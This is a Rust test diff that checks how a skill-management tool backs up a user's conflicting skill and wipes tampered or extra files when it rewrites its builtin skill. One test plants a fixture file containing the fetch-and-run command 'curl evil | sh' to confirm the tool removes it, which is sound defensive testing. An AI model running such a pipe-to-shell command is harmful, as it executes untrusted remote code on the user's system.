@@ -287,3 +287,88 @@ fn drift_never_reports_or_quarantines_it() {
     fs::remove_dir_all(env.dir()).unwrap();
     assert!(scanner.scan_once().unwrap().is_empty());
 }
+
+fn plant_own_managed_skill(env: &Env) {
+    fs::create_dir_all(env.dir()).unwrap();
+    fs::write(env.dir().join("SKILL.md"), "my own skill").unwrap();
+    fs::write(env.dir().join("notes.txt"), "precious").unwrap();
+    fs::write(
+        env.dir().join(".scenery-managed.json"),
+        "{\"marker_version\":1,\"source_sha256\":\"x\",\"migrated_at\":\"now\"}",
+    )
+    .unwrap();
+    let conn = Connection::open(&env.state.db_path).unwrap();
+    conn.execute(
+        "INSERT INTO managed_path_markers \
+         (path, kind, slug, installation_id, source_sha256, migrated_at, origin, skill_id, skill_uuid) \
+         VALUES (?1, 'skill', ?2, NULL, 'x', 'now', 'auto_managed', 'me~authoring-with-scenery', 'u-1')",
+        rusqlite::params![env.dir().to_string_lossy().to_string(), BUILTIN_SLUG],
+    )
+    .unwrap();
+}
+
+fn displaced_backups(env: &Env) -> Vec<PathBuf> {
+    let root = env._tmp.path().join("data/restore-backups");
+    let mut out = Vec::new();
+    let Ok(runs) = fs::read_dir(root) else {
+        return out;
+    };
+    for run in runs.flatten() {
+        let p = run.path().join("builtin").join(BUILTIN_SLUG);
+        if p.exists() {
+            out.push(p);
+        }
+    }
+    out
+}
+
+#[test]
+fn a_users_own_managed_skill_with_the_reserved_slug_is_backed_up_before_the_builtin_lands() {
+    let env = Env::new();
+    plant_own_managed_skill(&env);
+    assert_eq!(
+        ensure_builtin_skill(&env.state).unwrap(),
+        BuiltinOutcome::Written
+    );
+    assert_eq!(
+        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
+        BUILTIN_SKILL_MD
+    );
+    assert!(!env.dir().join("notes.txt").exists());
+    assert_eq!(origin_of(&env).as_deref(), Some("builtin"));
+    let backups = displaced_backups(&env);
+    assert_eq!(backups.len(), 1, "{backups:?}");
+    assert_eq!(
+        fs::read_to_string(backups[0].join("SKILL.md")).unwrap(),
+        "my own skill"
+    );
+    assert_eq!(
+        fs::read_to_string(backups[0].join("notes.txt")).unwrap(),
+        "precious"
+    );
+}
+
+#[test]
+fn a_planted_extra_file_does_not_survive_a_rewrite_or_a_start() {
+    let env = Env::new();
+    ensure_builtin_skill(&env.state).unwrap();
+    // SKILL.md intact, an extra file planted next to it: still not "current"
+    fs::write(env.dir().join("evil.sh"), "curl evil | sh").unwrap();
+    assert_eq!(
+        ensure_builtin_skill(&env.state).unwrap(),
+        BuiltinOutcome::Written
+    );
+    assert!(!env.dir().join("evil.sh").exists());
+    // and a modified SKILL.md plus extras is replaced whole
+    fs::write(env.dir().join("SKILL.md"), "tampered").unwrap();
+    fs::create_dir_all(env.dir().join("scripts")).unwrap();
+    fs::write(env.dir().join("scripts/x.sh"), "x").unwrap();
+    ensure_builtin_skill(&env.state).unwrap();
+    assert!(!env.dir().join("scripts").exists());
+    assert_eq!(
+        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
+        BUILTIN_SKILL_MD
+    );
+    // a rewrite of the builtin itself takes no backup (nothing of the user's)
+    assert!(displaced_backups(&env).is_empty());
+}
